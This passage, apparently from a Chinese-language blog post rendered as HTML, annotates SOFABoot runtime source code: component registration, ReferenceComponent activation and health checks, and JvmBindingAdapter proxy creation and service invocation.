ci.getName(), t);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ci;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 卸载</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">unregister</span><span class="params">(ComponentInfo componentInfo)</span> <span class="keyword">throws</span> ServiceRuntimeException </span>&#123;</span><br><span class="line">        ComponentName componentName = componentInfo.getName();</span><br><span class="line">        registry.remove(componentName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (componentName != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ComponentType componentType = componentName.getType();</span><br><span class="line"></span><br><span class="line">            Map&lt;ComponentName, ComponentInfo&gt; typesRi = resolvedRegistry.get(componentType);</span><br><span class="line">            typesRi.remove(componentName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        componentInfo.unregister();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 基于类型归纳组件信息</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">typeRegistry</span><span class="params">(ComponentInfo componentInfo)</span> </span>&#123;</span><br><span class="line">        ComponentName name = componentInfo.getName();</span><br><span class="line">        <span class="keyword">if</span> (name != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ComponentType type = name.getType();</span><br><span class="line">            Map&lt;ComponentName, ComponentInfo&gt; typesRi = resolvedRegistry.get(type);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (typesRi == <span class="keyword">null</span>) &#123;</span><br><span class="line">                resolvedRegistry.putIfAbsent(type, <span class="keyword">new</span> HashMap&lt;ComponentName, ComponentInfo&gt;());</span><br><span class="line">                typesRi = resolvedRegistry.get(type);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            typesRi.put(name, componentInfo);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="激活组件"><a href="#激活组件" class="headerlink" title="激活组件"></a>激活组件</h4><h5 id="ReferenceComponent为例"><a href="#ReferenceComponent为例" class="headerlink" title="ReferenceComponent为例"></a>ReferenceComponent为例</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReferenceComponent</span> <span class="keyword">extends</span> <span class="title">AbstractComponent</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">activate</span><span class="params">()</span> <span class="keyword">throws</span> ServiceRuntimeException </span>&#123;</span><br><span class="line">        <span class="comment">// 是否存在Binding，如：JvmBinding</span></span><br><span class="line">        <span class="keyword">if</span> (reference.hasBinding()) &#123;</span><br><span class="line">            Binding candidate = <span class="keyword">null</span>;</span><br><span class="line">            Set&lt;Binding&gt; bindings = reference.getBindings();</span><br><span class="line">            <span class="keyword">if</span> (bindings.size() == <span class="number">1</span>) &#123;</span><br><span class="line">                candidate = bindings.iterator().next();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bindings.size() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                Object backupProxy = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">for</span> (Binding binding : bindings) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (JvmBinding.JVM_BINDING_TYPE.getType().equals(binding.getName())) &#123;</span><br><span class="line">                        candidate = binding;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// Under normal RPC reference (local-first/jvm-first is not set to false) binding,</span></span><br><span class="line">                        <span class="comment">// backup proxy is the RPC proxy, which will be invoked if Jvm service is not found</span></span><br><span class="line">                        backupProxy = createProxy(reference, binding);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (candidate != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    ((JvmBinding) candidate).setBackupProxy(backupProxy);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Object proxy = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (candidate != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 基于选择的Binding创建代理</span></span><br><span class="line">                proxy = createProxy(reference, candidate);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 实例化一个默认实现(类似一个包装类，最终是通过proxy调用)</span></span><br><span class="line">            <span class="keyword">this</span>.implementation = <span class="keyword">new</span> DefaultImplementation();</span><br><span class="line">            implementation.setTarget(proxy);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// componentStatus = ComponentStatus.ACTIVATED;</span></span><br><span class="line">        <span class="keyword">super</span>.activate();</span><br><span class="line">        latch.countDown();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">createProxy</span><span class="params">(Reference reference, Binding binding)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// JvmBindingAdapter</span></span><br><span class="line">        BindingAdapter&lt;Binding&gt; bindingAdapter = bindingAdapterFactory.getBindingAdapter(binding</span><br><span class="line">            .getBindingType());</span><br><span class="line">        <span class="keyword">if</span> (bindingAdapter == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ServiceRuntimeException(<span class="string">"Can't find BindingAdapter of type "</span></span><br><span class="line">                                              + binding.getBindingType() + <span class="string">" for reference "</span></span><br><span class="line">                                              + reference + <span class="string">"."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// &gt;&gt;In Binding [jvm] Begins - com.alipay.sofa.isle.sample.SampleJvmService.</span></span><br><span class="line">        SofaLogger.info(<span class="string">" &gt;&gt;In Binding [&#123;&#125;] Begins - &#123;&#125;."</span>, binding.getBindingType(), reference);</span><br><span class="line">        Object proxy;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取代理对象，参考下文</span></span><br><span class="line">            proxy = bindingAdapter.inBinding(reference, binding, sofaRuntimeContext);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// &gt;&gt;In Binding [jvm] Ends - com.alipay.sofa.isle.sample.SampleJvmService.</span></span><br><span class="line">            SofaLogger.info(<span class="string">" &gt;&gt;In Binding [&#123;&#125;] Ends - &#123;&#125;."</span>, binding.getBindingType(), reference);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查当前组件的状态，在Biz启动完成后执行健康检查，Biz下所有组件检查通过则将Biz标记为actived</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> HealthResult <span class="title">isHealthy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!isActivated()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.isHealthy();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        HealthResult result = <span class="keyword">new</span> HealthResult(componentName.getRawName());</span><br><span class="line">        List&lt;HealthResult&gt; bindingHealth = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        JvmBinding jvmBinding = <span class="keyword">null</span>;</span><br><span class="line">        HealthResult jvmBindingHealthResult = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (reference.hasBinding()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Binding binding : reference.getBindings()) &#123;</span><br><span class="line">                bindingHealth.add(binding.healthCheck());</span><br><span class="line">                <span class="keyword">if</span> (JvmBinding.JVM_BINDING_TYPE.equals(binding.getBindingType())) &#123;</span><br><span class="line">                    jvmBinding = (JvmBinding) binding;</span><br><span class="line">                    jvmBindingHealthResult = bindingHealth.get(bindingHealth.size() - <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// check reference has a corresponding service</span></span><br><span class="line">        <span class="comment">// 可通过 com.alipay.sofa.boot.skipJvmReferenceHealthCheck=true 设置为不检查组件的健康状态（如有些组件实现是通过ark动态安装进来的，就会出现Biz启动不成功的问题）</span></span><br><span class="line">        <span class="keyword">if</span> (!SofaRuntimeProperties.isSkipJvmReferenceHealthCheck(sofaRuntimeContext)</span><br><span class="line">            &amp;&amp; jvmBinding != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Object serviceTarget = getServiceTarget();</span><br><span class="line">            <span class="keyword">if</span> (serviceTarget == <span class="keyword">null</span> &amp;&amp; !jvmBinding.hasBackupProxy()) &#123;</span><br><span class="line">                jvmBindingHealthResult.setHealthy(<span class="keyword">false</span>);</span><br><span class="line">                jvmBindingHealthResult.setHealthReport(<span class="string">"can not find corresponding jvm service"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        List&lt;HealthResult&gt; failedBindingHealth = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (HealthResult healthResult : bindingHealth) &#123;</span><br><span class="line">            <span class="keyword">if</span> (healthResult != <span class="keyword">null</span> &amp;&amp; !healthResult.isHealthy()) &#123;</span><br><span class="line">                failedBindingHealth.add(healthResult);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (failedBindingHealth.size() == <span class="number">0</span>) &#123;</span><br><span class="line">            result.setHealthy(<span class="keyword">true</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            StringBuilder healthReport = <span class="keyword">new</span> StringBuilder(<span class="string">"|"</span>);</span><br><span class="line">            <span class="keyword">for</span> (HealthResult healthResult : failedBindingHealth) &#123;</span><br><span class="line">                healthReport.append(healthResult.getHealthName()).append(<span class="string">"#"</span>)</span><br><span class="line">                    .append(healthResult.getHealthReport());</span><br><span class="line">            &#125;</span><br><span class="line">            result.setHealthReport(healthReport.substring(<span class="number">1</span>, healthReport.length()));</span><br><span class="line">            result.setHealthy(<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>JvmBindingAdapter.java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JvmBindingAdapter</span> <span class="keyword">implements</span> <span class="title">BindingAdapter</span>&lt;<span class="title">JvmBinding</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现 BindingAdapter 接口方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">inBinding</span><span class="params">(Object contract, JvmBinding binding,</span></span></span><br><span class="line"><span class="function"><span class="params">                            SofaRuntimeContext sofaRuntimeContext)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> createServiceProxy((Contract) contract, binding, sofaRuntimeContext);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">createServiceProxy</span><span class="params">(Contract contract, JvmBinding binding,</span></span></span><br><span class="line"><span class="function"><span class="params">                                      SofaRuntimeContext sofaRuntimeContext)</span> </span>&#123;</span><br><span class="line">        ClassLoader newClassLoader;</span><br><span class="line">        <span class="comment">// 获取加载器，如：BizClassLoader(bizIdentity=Startup In IDE:Mock version)</span></span><br><span class="line">        ClassLoader appClassLoader = sofaRuntimeContext.getAppClassLoader();</span><br><span class="line">        Class&lt;?&gt; javaClass = contract.getInterfaceType();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class appLoadedClass = appClassLoader.loadClass(javaClass.getName());</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (appLoadedClass == javaClass) &#123;</span><br><span class="line">                newClassLoader = appClassLoader;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                newClassLoader = javaClass.getClassLoader();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            newClassLoader = javaClass.getClassLoader();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ClassLoader oldClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.currentThread().setContextClassLoader(newClassLoader);</span><br><span class="line">            <span class="comment">// 实例化 JvmServiceInvoker，通过此对象调用服务</span></span><br><span class="line">            ServiceProxy handler = <span class="keyword">new</span> JvmServiceInvoker(contract, binding, sofaRuntimeContext);</span><br><span class="line">            ProxyFactory factory = <span class="keyword">new</span> ProxyFactory();</span><br><span class="line">            <span class="keyword">if</span> (javaClass.isInterface()) &#123;</span><br><span class="line">                factory.addInterface(javaClass);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                factory.setTargetClass(javaClass);</span><br><span class="line">                factory.setProxyTargetClass(<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            factory.addAdvice(handler);</span><br><span class="line">            <span class="comment">// 返回代理对象</span></span><br><span class="line">            <span class="keyword">return</span> factory.getProxy(newClassLoader);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            Thread.currentThread().setContextClassLoader(oldClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ***执行组件服务调用，即找到对应的 @SofaService 声明的服务***</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">JvmServiceInvoker</span> <span class="keyword">extends</span> <span class="title">ServiceProxy</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(MethodInvocation invocation)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!SofaRuntimeProperties.isJvmFilterEnable()) &#123;</span><br><span class="line">                <span class="comment">// Jvm filtering is not enabled</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">super</span>.invoke(invocation);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ClassLoader oldClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">            JvmFilterContext context = <span class="keyword">new</span> JvmFilterContext(invocation);</span><br><span class="line">            Object rtn;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (getTarget() == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 获取目标服务（实现类）</span></span><br><span class="line">                ServiceComponent serviceComponent = DynamicJvmServiceProxyFinder</span><br><span class="line">                    .getDynamicJvmServiceProxyFinder().findServiceComponent(</span><br><span class="line">                        sofaRuntimeContext.getAppClassLoader(), contract);</span><br><span class="line">                <span class="keyword">if</span> (serviceComponent == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// Jvm service is not found in normal or Ark environment</span></span><br><span class="line">                    <span class="comment">// We're actually invoking an RPC service, skip Jvm filtering</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">super</span>.invoke(invocation);</span><br><span class="line">                &#125;</span><br><span class="line">                context.setSofaRuntimeContext(serviceComponent.getContext());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                context.setSofaRuntimeContext(sofaRuntimeContext);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">long</span> startTime = System.currentTimeMillis();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.currentThread().setContextClassLoader(serviceClassLoader);</span><br><span class="line">                <span class="comment">// Do Jvm filter &lt;code&gt;before&lt;/code&gt; invoking</span></span><br><span class="line">                <span class="comment">// if some filter returns false, skip remaining filters and actual Jvm invoking</span></span><br><span class="line">                <span class="keyword">if</span> (JvmFilterHolder.beforeInvoking(context)) &#123;</span><br><span class="line">                    rtn = doInvoke(invocation);</span><br><span class="line">                    context.setInvokeResult(rtn);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                <span class="comment">// Exception occurs, set &lt;code&gt;e&lt;/code&gt; in Jvm context</span></span><br><span class="line">                context.setException(e);</span><br><span class="line">                doCatch(invocation, e, startTime);</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="comment">// Do Jvm Filter &lt;code&gt;after&lt;/code&gt; invoking regardless of the fact whether exception happens or not</span></span><br><span class="line">                JvmFilterHolder.afterInvoking(context);</span><br><span class="line">                rtn = context.getInvokeResult();</span><br><span class="line">                doFinally(invocation, startTime);</span><br><span class="line">                Thread.currentThread().setContextClassLoader(oldClassLoader);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> rtn;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">doInvoke</span><span class="params">(MethodInvocation invocation)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (binding.isDestroyed()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Can not call destroyed reference! JVM Reference["</span></span><br><span class="line">                                                + getInterfaceName() + <span class="string">"#"</span> + getUniqueId()</span><br><span class="line">                                                + <span class="string">"] has already been destroyed."</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            SofaLogger.debug(<span class="string">"&gt;&gt; Start in JVM service invoke, the service interface is  - &#123;&#125;"</span>,</span><br><span class="line">                getInterfaceName());</span><br><span class="line"></span><br><span class="line">            Object retVal;</span><br><span class="line">            Object targetObj = <span class="keyword">this</span>.getTarget();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// invoke internal dynamic-biz jvm service</span></span><br><span class="line">            <span class="keyword">if</span> (targetObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">                ServiceProxy serviceProxy = DynamicJvmServiceProxyFinder</span><br><span class="line">                    .getDynamicJvmServiceProxyFinder().findServiceProxy(</span><br><span class="line">                        sofaRuntimeContext.getAppClassLoader(), contract);</span><br><span class="line">                <span class="keyword">if</span> (serviceProxy != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> serviceProxy.invoke(invocation);</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        SofaLogger.debug(</span><br><span class="line">                            <span class="string">"&lt;&lt; Finish Cross App JVM service invoke, the service is  - &#123;&#125;]"</span>,</span><br><span class="line">                            (getInterfaceName() + <span class="string">"#"</span> + getUniqueId()));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (targetObj == <span class="keyword">null</span> || ((targetObj <span class="keyword">instanceof</span> Proxy) &amp;&amp; binding.hasBackupProxy())) &#123;</span><br><span class="line">                targetObj = binding.getBackupProxy();</span><br><span class="line">                SofaLogger.debug(<span class="string">"&lt;&lt;&#123;&#125;.&#123;&#125; backup proxy invoke."</span>, getInterfaceName().getName(),</span><br><span class="line">                    invocation.getMethod().getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (targetObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(</span><br><span class="line">                    <span class="string">"JVM Reference["</span></span><br><span class="line">                            + getInterfaceName()</span><br><span class="line">                            + <span class="string">"#"</span></span><br><span class="line">                            + getUniqueId()</span><br><span class="line">                            + <span class="string">"] can not find the corresponding JVM service. "</span></span><br><span class="line">                            + <span class="string">"Please check if there is a SOFA deployment publish the corresponding JVM service. "</span></span><br><span class="line">                            + <span class="string">"If this exception occurred when the application starts up, please add Require-Module to SOFA deployment's MANIFEST.MF to indicate the startup dependency of SOFA modules."</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ClassLoader tcl = Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                pushThreadContextClassLoader(sofaRuntimeContext.getAppClassLoader());</span><br><span class="line">                retVal = invocation.getMethod().invoke(targetObj, invocation.getArguments());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">                <span class="keyword">throw</span> ex.getTargetException();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                SofaLogger.debug(</span><br><span class="line">                    <span class="string">"&lt;&lt; Finish JVM service invoke, the service implementation is  - &#123;&#125;]"</span>,</span><br><span class="line">                    (<span class="keyword">this</span>.target == <span class="keyword">null</span> ? <span class="string">"null"</span> : <span class="keyword">this</span>.target.getClass().getName()));</span><br><span class="line"></span><br><span class="line">                popThreadContextClassLoader(tcl);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> retVal;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ServiceComponent为例"><a href="#ServiceComponent为例" class="headerlink" title="ServiceComponent为例"></a>ServiceComponent为例</h5><ul><li>初始化模块的时候会调用，参考下文<a href="#并行刷新SpringContext">并行刷新SpringContext</a></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 